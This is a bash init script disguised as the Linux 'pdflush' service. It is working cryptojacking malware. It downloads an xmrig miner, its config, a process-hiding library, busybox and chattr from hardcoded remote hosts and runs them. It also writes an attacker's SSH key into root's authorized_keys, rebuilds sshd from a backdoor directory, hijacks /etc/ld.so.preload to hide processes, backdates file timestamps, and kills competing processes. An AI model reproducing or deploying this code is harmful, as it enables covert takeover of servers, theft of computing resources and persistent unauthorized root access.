#!/bin/bash
#chkconfig: 2345 81 96
#description:pdflush

pdflushType="launch"

threads=`cat /proc/cpuinfo|grep "processor"|wc -l`      # Get the number of cores
launch="/etc/init.d/pdflushs"   # Master script
xmrig="/usr/bin/kthreadds"      # Mining file
config="/usr/bin/config.json"   # Mining configuration file
busybox="/lib64/busybox"        # busybox
sha512Busybox="89dafd4be9d51135ec8ad78a9ac24c29f47673a9fb3920dac9df81c7b6b850ad8e7219a0ded755c2b106a736804c9de3174302a2fba6130196919777cb516a4f"        # SHA-512 hash of busybox
chattr="/lib64/libg++.so"       # chattr
preload="/etc/ld.so.preload"    # preload library hijacking file
processhider="/lib64/libstdc++.so"      # prochider process hiding tool
backdoor="/lib64/gc++"  # Backdoor program directory
cron="/lib64/libgc++.so"        # cron daemon file
ssh="/etc/ssh"          # ssh file
sshd="/usr/sbin"        # sshd file

# Print usage
usage()
{
        echo "Usage: $launch {start|status}"
}

# Print running status
status ()
{
        echo -e "\033[32mRunning... \033[0m"
}

# Check for updates
checkUpdate()
{
        tmepIp=`$busybox ping Rainbow66.f3322.net -c1|$busybox sed '1{s/[^(]*(//;s/).*//;q}'`   # 148.70.199.147
        if [[ $tmepIp == "127.0.0.1" ]]
        then
                remoteIp=188.121.119.155
        elif [[ $tmepIp =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]
        then
                FIELD1=$(echo $tmepIp|cut -d. -f1)
                FIELD2=$(echo $tmepIp|cut -d. -f2)
                FIELD3=$(echo $tmepIp|cut -d. -f3)
                FIELD4=$(echo $tmepIp|cut -d. -f4)
                if [ $FIELD1 -le 255 -a $FIELD2 -le 255 -a $FIELD3 -le 255 -a $FIELD4 -le 255 ]
                then
                        remoteIp=$tmepIp
                else
                        remoteIp=188.121.119.155
                fi
        fi

        # Get SHA-512 of each component
    remoteXmrigSha512=`$busybox wget http://$remoteIp/sha512/xmrig -O - -q`
    remotePdflushsSha512=`$busybox wget http://$remoteIp/sha512/$pdflushType -O - -q`
    remoteProcesshiderSha512=`$busybox wget http://$remoteIp/sha512/processhider -O - -q`
    remoteCronSha512=`$busybox wget http://$remoteIp/sha512/cron -O - -q`
    localXmrigSha512=`$busybox sha512sum $xmrig|$busybox awk '{print $1}'`
    localPdflushsSha512=`$busybox sha512sum $launch|$busybox awk '{print $1}'`
    localBusyboxSha512=`$busybox sha512sum $busybox|$busybox awk '{print $1}'`
    localProcesshiderSha512=`$busybox sha512sum $processhider|$busybox awk '{print $1}'`
    localCronSha512=`$busybox sha512sum $cron|$busybox awk '{print $1}'`
    if [[ $remotePdflushsSha512 != $localPdflushsSha512 ]]
    then
                $busybox chattr -iaR /lib64/
                $busybox wget http://$remoteIp/update/launchUpdate -O /lib64/launchUpdate
                $busybox chmod a+x /lib64/launchUpdate
                nohup /lib64/launchUpdate > /dev/null &
    fi
        if [[ $remoteXmrigSha512 != $localXmrigSha512 ]]
        then
                $busybox chattr -iaR /usr/bin/
                $busybox rm -f $xmrig
                $busybox kill -9 `$busybox ps|$busybox grep kthreadds|$busybox grep -v grep|$busybox awk '{print $1}'`
        fi
        if [[ $remoteProcesshiderSha512 != $localProcesshiderSha512 ]]
        then
                $busybox chattr -iaR /lib64/
                $busybox rm -f $processhider
                $busybox wget http://$remoteIp/xmrig/processhider.so -O $processhider
                timeFile=`$busybox ls -t /lib64|$busybox tail -1`
                $busybox touch -r /lib64/$timeFile $processhider
                $busybox chattr +ai $processhider
        fi
        if [[ $remoteCronSha512 != $localCronSha512 ]]
        then
                $busybox chattr -iaR /lib64/
                $busybox rm -f $cron
                $busybox kill -9 `$busybox ps|$busybox grep "libgc++.so"|$busybox grep -v grep|$busybox awk '{print $1}'`
        fi
        exit
}

# Check if the backdoor public key is in authorized_keys
checkBackdoor(){
        $busybox chattr +ai /root/.ssh/authorized_keys
        $busybox chattr -R +ai $backdoor
        if [[ ! -e /root/.ssh ]]
        then
                mkdir /root/.ssh
        else
                $busybox chattr -aiR /root/.ssh/
        fi
        if ! $busybox grep -q "crbv0ds3/3MgVNHfXHGcCw" /root/.ssh/authorized_keys || [[ ! -f /root/.ssh/authorized_keys ]]
        then
                $busybox echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDV0zreCpf9ddN6w3XvbnwJRxzav3A0nGCX+tAjanb5BRDD1pLJXabRJxF28Lf7MtcvbF/vripTwM62FjfODIDuqrBKv2crbv0ds3/3MgVNHfXHGcCw6x5ezV0+kfyY0OBlVJv7iP9Q78mM38/Nfz/gGN5vYtsR3zVZrk23spXRFhuPbE8P6PHTAyXC99wi/cISBnV1130hz7/wi1M55PaXXHn+et3CPmao4yAV5zI2tatird5zMETIYK2n8VmkOUtIMlNDZC8wUhv/RB+Lgk81uPc3HCI/r8hulMAYyp8Bj2eHN1DDTWOpLqohnI45NGeReR2JIA/6l2lJNbQ+IRCn rsa 2048-040119" > /root/.ssh/authorized_keys
                $busybox chattr +ai /root/.ssh/authorized_keys
        fi
        if [[ `$busybox lsattr /root/.ssh/authorized_keys|$busybox awk '{print $1}'|$busybox grep i|$busybox grep -v grep|$busybox wc -l` != 1 ]]
        then
                $busybox chattr +ai /root/.ssh/authorized_keys
        fi
        if [[ $threads -gt 8 ]]
        then 
                if [[ `ssh -B` != "Congratulations!" || `sshd -B` != "Congratulations!" ]]
                then
                        $busybox chattr -ai /etc/ssh/ssh_config
                        $busybox chattr -ai /etc/ssh/sshd_config
                        $busybox chattr -ai /etc/ssh/ssh_host_rsa_key
                        $busybox rm /etc/ssh/ssh_config
                        $busybox rm /etc/ssh/sshd_config
                        $busybox rm /etc/ssh/ssh_host_rsa_key
                        $busybox chattr -ai `$busybox which ssh`
                        $busybox chattr -ai `$busybox which sshd`
                        $busybox chattr -Rai $backdoor
                        cd $backdoor
                        make install
                        $busybox chattr -R +ai $backdoor
                        timeFile=`$busybox ls -t $ssh|$busybox tail -1`
                        $busybox touch -r $timeFile /etc/ssh/ssh_config
                        $busybox touch -r $timeFile /etc/ssh/sshd_config
                        $busybox touch -r $timeFile /etc/ssh/ssh_host_rsa_key
                        $busybox chmod a+x $ssh
                        $busybox chmod a+x `$busybox which sshd`
                fi
        fi
        exit
}

# Check cron process
checkCronProc()
{
        cronProc=`$busybox ps|$busybox grep "cron"|$busybox grep -v grep`
        if [[ ! $cronProc ]]
        then
                $busybox chattr -iaR /lib64
                $busybox wget http://$remoteIp/cron -O $cron
                $busybox chmod a+x $cron
                nohup $cron > /dev/null &
        fi
}

# Check cron file
checkCronFile()
{
        if [[ ! -e $cron || ! -x $cron ]]
        then
                $busybox chattr -iaR /lib64/
                $busybox wget http://$remoteIp/cron -O $cron
                $busybox chmod a+x $cron
        fi
}

# Check xmrig process
checkXmrigProc()
{
        xmrigProc=`$busybox ps|$busybox grep kthreadds|$busybox grep -v grep`
        if [[ ! $xmrigProc ]]
        then
                nohup $xmrig > /dev/null &
        fi
        if [[ `$busybox ps|$busybox grep kthreadds|$busybox grep -v grep|$busybox wc -l` -gt 1 ]]
        then
                $busybox kill -9 `$busybox ps|$busybox grep kthreadds|$busybox grep -v grep|$busybox awk '{print $1}'`
        fi
        if [[ `$busybox ps|$busybox grep kthreadds|$busybox grep -v grep|$busybox wc -l` == 0 ]]
        then
                nohup $xmrig > /dev/null &
        fi
        exit
}

# Kill other processes with high CPU usage
killOtherProc()
{
        killProc=`$busybox ps -eo pid,pcpu,comm|$busybox awk '$2 >= 95.0 {print $1}'`
        if [[ $killProc ]]
        then
                $busybox kill -9 $killProc
        fi
}

# Check xmrig file
checkXmrigFile()
{
        if [[ ! -e $xmrig || ! -x $xmrig ]]
        then
                $busybox chattr -iaR /usr/bin/
                $busybox rm -f $xmrig
                $busybox wget http://$remoteIp/xmrig/xmrig -O $xmrig
                $busybox chmod a+x $xmrig
        fi
        if [[ ! -e $config || ! -x $config ]]
        then
                $busybox chattr -iaR /usr/bin/
                $busybox rm -f $config
                $busybox wget http://$remoteIp/xmrig/config.json -O $config
                $busybox chmod a+x $config
        fi
}

# Check preload file
checkPreloadFile()
{
        if [[ ! -e $preload || ! -x $preload ]]
        then
                $busybox chattr -iaR /etc/
                $busybox wget http://$remoteIp/preload -O $preload
                $busybox chmod a+x $preload
        fi
        if ! $busybox grep -q "$processhider" $preload
        then
                $busybox echo "$processhider" >> $preload
        fi
}

# Check self file
checkSelfFile()
{
        if [[ ! -e $launch || ! -x $launch ]]
        then
                $busybox chattr -iaR /lib64/
                $busybox wget http://$remoteIp/update/$pdflushType -O $launch
                $busybox chmod a+x $launch
        fi
}

# Check chattr executable
checkChattrExecute()
{
        if [[ ! -e $chattr || ! -x $chattr ]]
        then
                $busybox chattr -iaR /lib64/
                $busybox wget http://$remoteIp/chattr -O $chattr
                $busybox chmod a+x $chattr
        fi
        if [[ ! `$busybox stat -c %Y $chattr` -gt `date +%s` ]]
        then
                $busybox touch $chattr
        fi
}

# Check busybox file
checkBusyboxFile()
{
        if [[ ! -e $busybox || ! -x $busybox ]]
        then
                $busybox chattr -iaR /lib64/
                $busybox wget http://$remoteIp/busybox -O $busybox
                $busybox chmod a+x $busybox
        fi
        if [[ $sha512Busybox != `$busybox sha512sum $busybox|$busybox awk '{print $1}'` ]]
        then
                $busybox chattr -iaR /lib64/
                $busybox wget http://$remoteIp/busybox -O $busybox
                $busybox chmod a+x $busybox
        fi
}

# Main loop
while true
do
        checkUpdate
        checkBackdoor
        checkCronProc
        checkCronFile
        checkXmrigProc
        killOtherProc
        checkXmrigFile
        checkPreloadFile
        checkSelfFile
        checkChattrExecute
        checkBusyboxFile
        sleep 1
done
